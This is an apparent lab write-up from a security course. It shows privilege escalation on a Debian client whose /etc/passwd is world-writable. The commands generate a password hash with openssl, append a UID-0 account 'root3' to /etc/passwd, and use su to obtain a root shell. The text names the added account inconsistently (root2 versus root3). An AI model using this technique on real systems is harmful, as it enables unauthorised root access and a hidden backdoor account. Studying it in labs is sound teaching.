18.3.3.1

# 18.3.3.1.1. Log in to your Debian client with your student credentials and attempt to elevate your privileges by adding a superuser account to the /etc/passwd file.

For backwards compatability, if a **password hash** is present in the second column of an /etc/passwd user record, it is considered valid for authentication and takes precedence over the respective entry in /etc/shadow if available.

The /etc/passwd permissions on the Debian client were not set correctly. We will add another superuser (root2) and the corresponding hash to the /etc/passwd file.

View the incorrect permissions for /etc/passwd
```plaintext
student@debian:~$ ls -la /etc/passwd
-rwxrwxrwx 1 root root 1971 Oct  3 18:06 /etc/passwd
```

Generate the password hash with the help of openssl and passwd
```plaintext
student@debian:~$ openssl passwd evil
3X7BhwYRtV3cU
```
Add a new user (root3) to /etc/passwd and use the password hash created previously.
```plaintext
student@debian:~$ echo "root3:3X7BhwYRtV3cU:0:0:root:/root:/bin/bash" >> /etc/passwd
```
Log ing as the newly added user root3
```plaintext
student@debian:~$ su root3
Password: 
root@debian:/home/student# whoami
root
root@debian:/home/student#
```
![cb7b01db511de15c62c168b1b7ffaeb1.png](e3432c7ba29f43bcb7b8edba55ae5f0f.png)